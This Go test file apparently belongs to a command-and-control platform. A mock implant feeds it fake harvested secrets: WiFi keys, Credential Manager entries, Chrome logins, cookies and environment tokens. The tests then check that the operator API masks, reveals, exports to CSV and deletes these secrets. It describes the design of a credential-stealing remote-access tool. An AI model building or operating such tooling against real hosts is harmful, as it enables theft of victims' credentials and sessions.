package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"c2-platform/internal/protocol"
)

// credsMockImplant answers one CmdCreds / CmdBrowserDeep with a row set that
// exercises the parser: real kinds, an empty secret, a short secret that must
// be fully masked, and a malformed line with too few columns.
func credsMockImplant(t *testing.T, addr string, ready chan struct{}) {
	t.Helper()
	var c net.Conn
	var err error
	for i := 0; i < 40; i++ {
		if c, err = net.Dial("tcp", addr); err == nil {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if err != nil {
		t.Errorf("dial: %v", err)
		return
	}
	defer c.Close()

	reg := protocol.Register{Ver: 1, PID: 42, Hostname: "mock-pc", Username: "alice", OS: "windows", Arch: "x64", IP: "10.0.0.8"}
	if _, err := c.Write(protocol.Encode(protocol.CmdRegister, reg.Marshal())); err != nil {
		t.Errorf("register: %v", err)
		return
	}
	if _, err := protocol.Decode(c); err != nil {
		t.Errorf("rsp ok: %v", err)
		return
	}
	close(ready)

	var mu sync.Mutex
	send := func(typ protocol.Type, p []byte) {
		mu.Lock()
		defer mu.Unlock()
		_, _ = c.Write(protocol.Encode(typ, p))
	}
	for {
		f, err := protocol.Decode(c)
		if err != nil {
			return
		}
		switch f.Type {
		case protocol.CmdCreds, protocol.CmdBrowserDeep:
			rows := strings.Join([]string{
				"W\tWiFi\tOffice-5G\t\tSup3rSecretKey\t netsh key=clear\t",
				"M\tCredMan\tLegacyBox\tcorp\\svc_backup\tP@ssw0rd-2024\ttype=1\tCredential Manager",
				"C\tChrome\thttps://github.com\toctocat\tghp_ABCDEFGHIJKLMNOP\t times_used=7 \tC:/Users/alice/Login Data",
				"S\tChrome\t.example.com\tsid\tabcdef1234567890\tcookie\tC:/Users/alice/Cookies",
				"E\tEnv\tAPI_TOKEN\t\tshort\twindows 环境变量\t",
				"broken line without tabs",
			}, "\n")
			send(protocol.RspData, []byte(rows))
			send(protocol.RspEnd, nil)
		case protocol.CmdQuit:
			return
		}
	}
}

func TestCredsEndpointsWithMockImplant(t *testing.T) {
	h := testServer()
	ts := httptest.NewServer(h)
	defer ts.Close()

	login, _ := json.Marshal(map[string]string{"username": "admin", "password": "secret"})
	res, err := http.Post(ts.URL+"/api/login", "application/json", bytes.NewReader(login))
	if err != nil {
		t.Fatal(err)
	}
	var tok struct {
		Token string `json:"token"`
	}
	_ = json.NewDecoder(res.Body).Decode(&tok)
	res.Body.Close()
	if tok.Token == "" {
		t.Fatal("no token")
	}
	do := func(method, path string, body any) *http.Response {
		var r io.Reader
		if body != nil {
			b, _ := json.Marshal(body)
			r = bytes.NewReader(b)
		}
		req, _ := http.NewRequest(method, ts.URL+path, r)
		req.Header.Set("Authorization", "Bearer "+tok.Token)
		if body != nil {
			req.Header.Set("Content-Type", "application/json")
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		return resp
	}

	resp := do("POST", "/api/listeners", map[string]any{"name": "t", "bind": "127.0.0.1", "port": 37995})
	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		t.Fatalf("listener %d %s", resp.StatusCode, b)
	}
	resp.Body.Close()

	ready := make(chan struct{})
	go credsMockImplant(t, "127.0.0.1:37995", ready)
	select {
	case <-ready:
	case <-time.After(3 * time.Second):
		t.Fatal("implant did not register")
	}

	var sid string
	for i := 0; i < 20; i++ {
		resp = do("GET", "/api/sessions", nil)
		var rows []map[string]any
		_ = json.NewDecoder(resp.Body).Decode(&rows)
		resp.Body.Close()
		if len(rows) > 0 {
			sid, _ = rows[0]["id"].(string)
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if sid == "" {
		t.Fatal("no session")
	}
	// 1) kick a collection and wait for the task to finish
	resp = do("POST", "/api/sessions/"+sid+"/creds", map[string]string{"scope": "all"})
	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		t.Fatalf("creds start %d %s", resp.StatusCode, b)
	}
	var started struct {
		TaskID string `json:"task_id"`
	}
	_ = json.NewDecoder(resp.Body).Decode(&started)
	resp.Body.Close()
	if started.TaskID == "" {
		t.Fatal("no task id")
	}
	deadline := time.Now().Add(5 * time.Second)
	for {
		resp = do("GET", "/api/sessions/"+sid+"/tasks/"+started.TaskID, nil)
		var task struct {
			Done  bool   `json:"done"`
			Error string `json:"error"`
		}
		_ = json.NewDecoder(resp.Body).Decode(&task)
		resp.Body.Close()
		if task.Error != "" {
			t.Fatalf("task error %s", task.Error)
		}
		if task.Done {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("task did not finish")
		}
		time.Sleep(30 * time.Millisecond)
	}

	// 2) the list must be populated, masked and free of plaintext
	type item struct {
		ID        string `json:"id"`
		Kind      string `json:"kind"`
		Source    string `json:"source"`
		Target    string `json:"target"`
		User      string `json:"user"`
		Secret    string `json:"secret"`
		Note      string `json:"note"`
		HasSecret bool   `json:"has_secret"`
	}
	var view struct {
		At    int64 `json:"at"`
		Stats struct {
			Total, Browser, System, WiFi, CredMan, Env int
		} `json:"stats"`
		Kinds   []string `json:"kinds"`
		Sources []string `json:"sources"`
		Items   []item   `json:"items"`
	}
	for i := 0; i < 40; i++ {
		resp = do("GET", "/api/creds/mock-pc", nil)
		raw, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if strings.Contains(string(raw), "P@ssw0rd-2024") {
			t.Fatalf("list response leaked plaintext: %s", raw)
		}
		if strings.Contains(string(raw), "Sup3rSecretKey") {
			t.Fatalf("list response leaked wifi key: %s", raw)
		}
		if err := json.Unmarshal(raw, &view); err != nil {
			t.Fatalf("decode view: %v %s", err, raw)
		}
		if len(view.Items) > 0 {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if len(view.Items) != 5 {
		t.Fatalf("items %d: %+v", len(view.Items), view.Items)
	}
	if view.Stats.Total != 5 || view.Stats.WiFi != 1 || view.Stats.CredMan != 1 || view.Stats.Env != 1 {
		t.Fatalf("stats %+v", view.Stats)
	}
	if view.Stats.Browser != 2 || view.Stats.System != 3 {
		t.Fatalf("browser/system split %+v", view.Stats)
	}
	if view.At == 0 {
		t.Fatal("missing collection timestamp")
	}

	var credID, wifiID string
	for _, it := range view.Items {
		if it.Kind == "C" {
			credID = it.ID
			if it.User != "octocat" || !strings.Contains(it.Target, "github.com") {
				t.Fatalf("login row mangled: %+v", it)
			}
			if it.Secret != "gh••••OP" {
				t.Fatalf("mask %q", it.Secret)
			}
		}
		if it.Kind == "W" {
			wifiID = it.ID
			if it.Secret != "Su••••ey" {
				t.Fatalf("wifi mask %q", it.Secret)
			}
		}
		if it.Kind == "E" && it.Secret != "••••" {
			t.Fatalf("short secret must be fully masked: %q", it.Secret)
		}
	}
	if credID == "" || wifiID == "" {
		t.Fatalf("missing rows: %+v", view.Items)
	}
	if strings.Join(view.Kinds, ",") != "C,E,M,S,W" {
		t.Fatalf("kinds %v", view.Kinds)
	}

	// 3) reveal returns plaintext for the requested ids only
	resp = do("POST", "/api/creds/mock-pc/reveal", map[string]any{"ids": []string{credID}})
	var rev struct {
		Secrets map[string]string `json:"secrets"`
	}
	_ = json.NewDecoder(resp.Body).Decode(&rev)
	resp.Body.Close()
	if rev.Secrets[credID] != "ghp_ABCDEFGHIJKLMNOP" {
		t.Fatalf("reveal %+v", rev.Secrets)
	}
	if _, ok := rev.Secrets[wifiID]; ok {
		t.Fatal("reveal returned an unrequested id")
	}

	// 4) CSV export carries plaintext, a BOM and the Chinese header
	resp = do("GET", "/api/creds/mock-pc/export", nil)
	csv, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 || !strings.Contains(resp.Header.Get("Content-Disposition"), "creds-mock-pc.csv") {
		t.Fatalf("export %d %v", resp.StatusCode, resp.Header)
	}
	s := string(csv)
	if !strings.HasPrefix(s, "\xef\xbb\xbf") || !strings.Contains(s, "类型名") {
		t.Fatalf("csv header %q", s[:40])
	}
	if !strings.Contains(s, "P@ssw0rd-2024") || !strings.Contains(s, "浏览器账号") {
		t.Fatalf("csv body missing values: %s", s)
	}

	// 5) idempotent re-collection does not duplicate rows
	resp = do("POST", "/api/sessions/"+sid+"/creds", map[string]string{"scope": "all"})
	resp.Body.Close()
	time.Sleep(400 * time.Millisecond)
	resp = do("GET", "/api/creds/mock-pc", nil)
	_ = json.NewDecoder(resp.Body).Decode(&view)
	resp.Body.Close()
	if len(view.Items) != 5 {
		t.Fatalf("re-collection duplicated rows: %d", len(view.Items))
	}

	// 6) delete clears the collection
	resp = do("DELETE", "/api/creds/mock-pc", nil)
	resp.Body.Close()
	resp = do("GET", "/api/creds/mock-pc", nil)
	_ = json.NewDecoder(resp.Body).Decode(&view)
	resp.Body.Close()
	if len(view.Items) != 0 || view.Stats.Total != 0 {
		t.Fatalf("delete left data: %+v", view.Stats)
	}
}

func TestCredsRevealValidation(t *testing.T) {
	h := testServer()
	ts := httptest.NewServer(h)
	defer ts.Close()
	login, _ := json.Marshal(map[string]string{"username": "admin", "password": "secret"})
	res, _ := http.Post(ts.URL+"/api/login", "application/json", bytes.NewReader(login))
	var tok struct {
		Token string `json:"token"`
	}
	_ = json.NewDecoder(res.Body).Decode(&tok)
	res.Body.Close()

	req, _ := http.NewRequest("POST", ts.URL+"/api/creds/nohost/reveal", bytes.NewReader([]byte(`{}`)))
	req.Header.Set("Authorization", "Bearer "+tok.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 422 {
		t.Fatalf("empty ids should be rejected, got %d", resp.StatusCode)
	}

	// unknown host returns an empty, well-formed view rather than an error
	req, _ = http.NewRequest("GET", ts.URL+"/api/creds/nohost", nil)
	req.Header.Set("Authorization", "Bearer "+tok.Token)
	resp2, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp2.Body.Close()
	var v struct {
		Items []any `json:"items"`
		Stats struct {
			Total int `json:"total"`
		} `json:"stats"`
	}
	if err := json.NewDecoder(resp2.Body).Decode(&v); err != nil {
		t.Fatal(err)
	}
	if v.Stats.Total != 0 || v.Items == nil {
		t.Fatalf("empty view %+v", v)
	}
}

func TestBrowserKindsEndpoint(t *testing.T) {
	h := testServer()
	ts := httptest.NewServer(h)
	defer ts.Close()
	login, _ := json.Marshal(map[string]string{"username": "admin", "password": "secret"})
	res, _ := http.Post(ts.URL+"/api/login", "application/json", bytes.NewReader(login))
	var tok struct {
		Token string `json:"token"`
	}
	_ = json.NewDecoder(res.Body).Decode(&tok)
	res.Body.Close()

	req, _ := http.NewRequest("GET", ts.URL+"/api/sessions/any/browser/kinds", nil)
	req.Header.Set("Authorization", "Bearer "+tok.Token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var out struct {
		Kinds  []string          `json:"kinds"`
		Labels map[string]string `json:"labels"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		t.Fatal(err)
	}
	joined := fmt.Sprint(out.Kinds)
	for _, want := range []string{"history", "bookmarks", "cookies", "downloads", "autofill", "logins", "formhistory"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("kinds missing %s: %v", want, out.Kinds)
		}
	}
	if out.Labels["C"] != "浏览器账号" {
		t.Fatalf("labels %v", out.Labels)
	}
}
